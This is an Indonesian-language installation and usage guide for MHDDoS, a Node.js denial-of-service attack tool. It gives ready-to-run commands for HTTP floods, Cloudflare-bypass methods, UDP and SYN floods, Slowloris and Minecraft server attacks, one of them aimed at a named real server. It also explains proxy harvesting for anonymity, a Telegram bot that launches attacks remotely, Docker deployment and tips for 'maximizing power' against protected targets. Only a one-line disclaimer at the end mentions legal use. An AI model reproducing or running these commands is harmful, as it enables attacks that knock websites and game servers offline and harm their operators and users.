# 📦 Installation Guide - MHDDoS Node.js

## Cara Install dan Menjalankan

### 1️⃣ Persiapan

#### Requirements:
- **Node.js** versi 18 atau lebih baru
- **npm** (sudah termasuk dengan Node.js)
- **Git**
- Koneksi internet (untuk download dependencies dan proxies)

#### Cek Versi Node.js:
```bash
node --version
# Harus >= v18.0.0
```

Jika belum ada Node.js, install dari: https://nodejs.org/

---

### 2️⃣ Clone Repository

```bash
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
```

---

### 3️⃣ Install Dependencies

```bash
npm install
```

Proses ini akan menginstall semua dependencies yang diperlukan seperti:
- axios (HTTP requests)
- chalk (colored output)
- cloudscraper (Cloudflare bypass)
- telegraf (Telegram bot)
- commander (CLI framework)
- dll.

---

### 4️⃣ Konfigurasi (Opsional)

#### Setup Telegram Bot (Opsional):

1. Buat file `.env` dari template:
```bash
cp .env.example .env
```

2. Edit file `.env`:
```bash
nano .env  # atau gunakan text editor favorit
```

3. Isi dengan token bot Telegram kamu:
```env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_ADMIN_ID=123456789
```

**Cara dapat token:**
- Chat dengan [@BotFather](https://t.me/BotFather)
- Kirim `/newbot` dan ikuti instruksi
- Simpan token yang diberikan

**Cara dapat Admin ID:**
- Chat dengan [@userinfobot](https://t.me/userinfobot)
- Bot akan memberitahu ID kamu

---

### 5️⃣ Test Installation

#### Lihat daftar methods:
```bash
node index.js methods
```

Output yang benar:
```
📋 Layer 4 Methods:
UDP, TCP, MINECRAFT, MCBOT, CPS, CONNECTION, SYN, VSE, TS3, MCPE, FIVEM, FIVEM-TOKEN, OVH-UDP

📋 Layer 7 Methods:
GET, POST, HEAD, SLOW, HTTP2, HTTP2-POST, HTTP2-CF, CFB, CFBUAM, BYPASS, BOT, XMLRPC, ...
```

---

## 🚀 Cara Menggunakan

### Contoh Dasar - Layer 7 (Website)

#### 1. Attack HTTP GET Sederhana:
```bash
node index.js attack \
  -t https://example.com \
  -m GET \
  -th 100 \
  -d 60
```

Penjelasan:
- `-t` = Target (URL website)
- `-m` = Method (GET, POST, HTTP2, dll)
- `-th` = Threads (100 thread concurrent)
- `-d` = Duration (60 detik)

#### 2. Attack HTTP/2 dengan Cloudflare Bypass:
```bash
node index.js attack \
  -t https://cloudflare-site.com \
  -m HTTP2-CF \
  -th 200 \
  -d 120 \
  -r 5
```

Penjelasan tambahan:
- `-r` = RPC (Requests Per Connection) - 5 request per koneksi

#### 3. Attack dengan Proxy:

**Step 1:** Download proxies terlebih dahulu
```bash
node index.js proxy -t 5 -o socks5.txt
```

**Step 2:** Gunakan proxy dalam attack
```bash
node index.js attack \
  -t https://example.com \
  -m GET \
  -th 100 \
  -d 60 \
  -p 5 \
  -pf socks5.txt
```

Penjelasan:
- `-p` = Proxy Type (5 = SOCKS5)
- `-pf` = Proxy File (file yang berisi list proxy)

### Contoh Layer 4 (Game Server / IP)

#### 1. UDP Flood:
```bash
node index.js attack \
  -t 1.2.3.4:80 \
  -m UDP \
  -th 500 \
  -d 300
```

#### 2. Minecraft Server Attack:
```bash
node index.js attack \
  -t mc.hypixel.net:25565 \
  -m MINECRAFT \
  -th 100 \
  -d 180
```

#### 3. Minecraft Bot Spam:
```bash
node index.js attack \
  -t mc.server.com:25565 \
  -m MCBOT \
  -th 50 \
  -d 300
```

---

## 🤖 Menggunakan Telegram Bot

### 1. Start Bot:
```bash
node index.js telegram
```

Bot akan berjalan dan siap menerima command.

### 2. Buka Telegram dan chat bot kamu:
```
/start
```

### 3. Mulai attack dari Telegram:
```
/attack GET https://example.com 100 60
```

Format: `/attack <method> <target> <threads> <duration>`

### 4. Cek status attack:
```
/status
```

### 5. Stop attack:
```
/stop
```

---

## 🐳 Menggunakan Docker

### 1. Install Docker

**Ubuntu/Debian:**
```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
```

**Install Docker Compose:**
```bash
sudo apt install docker-compose
```

### 2. Build dan Run dengan Docker Compose:

```bash
# Build image
docker-compose build

# Run (show methods)
docker-compose up

# Run in background
docker-compose up -d

# View logs
docker-compose logs -f

# Stop
docker-compose down
```

### 3. Run Attack dengan Docker:

```bash
docker-compose run --rm mhddos attack \
  -t https://example.com \
  -m GET \
  -th 100 \
  -d 60
```

### 4. Run Telegram Bot dengan Docker:

```bash
# Pastikan sudah setup .env file
cp .env.example .env
nano .env  # isi dengan token dan admin ID

# Start bot
docker-compose --profile telegram up -d

# View bot logs
docker-compose logs -f telegram-bot
```

---

## 🔧 Troubleshooting

### Problem: "node: command not found"
**Solusi:** Install Node.js terlebih dahulu
```bash
# Ubuntu/Debian
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verify
node --version
```

### Problem: "Cannot find module 'xyz'"
**Solusi:** Install ulang dependencies
```bash
rm -rf node_modules package-lock.json
npm install
```

### Problem: "Permission denied"
**Solusi:** Berikan permission execute
```bash
chmod +x index.js
```

### Problem: Proxy tidak bisa download
**Solusi:** Cek koneksi internet atau coba provider proxy lain di `config.json`

### Problem: Attack tidak jalan / request 0
**Solusi:** 
1. Pastikan target bisa diakses: `curl https://target.com`
2. Cek firewall tidak block koneksi keluar
3. Coba method lain (misal ganti GET ke POST)
4. Coba tanpa proxy dulu

### Problem: "Raw socket requires root"
**Solusi:** Method SYN, ICMP butuh root access
```bash
sudo node index.js attack -t target -m SYN ...
```

---

## 💡 Tips & Tricks

### 1. **Untuk Target dengan Cloudflare:**
```bash
# Gunakan method HTTP2-CF atau CFB
node index.js attack -t https://target.com -m HTTP2-CF -th 200 -d 120 -r 5
```

### 2. **Untuk Target Tanpa Protection:**
```bash
# Gunakan GET/POST standard dengan RPC tinggi
node index.js attack -t https://target.com -m GET -th 100 -d 60 -r 10
```

### 3. **Untuk Game Server:**
```bash
# Gunakan UDP atau TCP dengan thread banyak
node index.js attack -t ip:port -m UDP -th 500 -d 300
```

### 4. **Maksimalkan Power:**
```bash
# Gunakan proxy + thread tinggi + RPC tinggi
node index.js attack \
  -t https://target.com \
  -m HTTP2-CF \
  -th 500 \
  -d 300 \
  -r 10 \
  -p 5 \
  -pf socks5.txt
```

### 5. **Slowloris Attack (Hold Connections):**
```bash
# Gunakan method SLOW dengan thread banyak dan duration lama
node index.js attack -t https://target.com -m SLOW -th 500 -d 600
```

---

## 📊 Memahami Output

Saat attack berjalan, kamu akan melihat output seperti:

```
🎯 Starting GET attack on https://example.com
⚙️  Threads: 100, Duration: 60s

📊 Progress: 10% | Requests: 1.2k | Data: 245.67 KB | Time: 6s / 60s
📊 Progress: 20% | Requests: 2.4k | Data: 512.34 KB | Time: 12s / 60s
📊 Progress: 30% | Requests: 3.6k | Data: 789.12 KB | Time: 18s / 60s
...
```

**Penjelasan:**
- **Progress:** Persentase waktu yang sudah berjalan
- **Requests:** Jumlah request yang terkirim (per detik)
- **Data:** Jumlah data yang terkirim (per detik)
- **Time:** Waktu yang sudah berjalan / total duration

---

## 🎓 Learning Path

### Untuk Pemula:
1. Mulai dengan method **GET** dan threads rendah (50-100)
2. Pelajari perbedaan Layer 4 vs Layer 7
3. Coba berbagai method untuk satu target
4. Lihat mana yang paling efektif

### Untuk Intermediate:
1. Pelajari cara menggunakan proxy
2. Eksperimen dengan RPC values
3. Coba HTTP/2 methods
4. Setup Telegram bot

### Untuk Advanced:
1. Kombinasi multiple methods
2. Optimize thread count berdasarkan resources
3. Custom proxy providers di config.json
4. Deploy dengan Docker cluster

---

## 📞 Butuh Bantuan?

- Buka **issue** di GitHub
- Chat bot Telegram (jika sudah setup)
- Baca dokumentasi lengkap di **README.md**

---

**Selamat Mencoba! 🚀**

*Remember: Gunakan tool ini secara bertanggung jawab dan hanya untuk tujuan legal!*
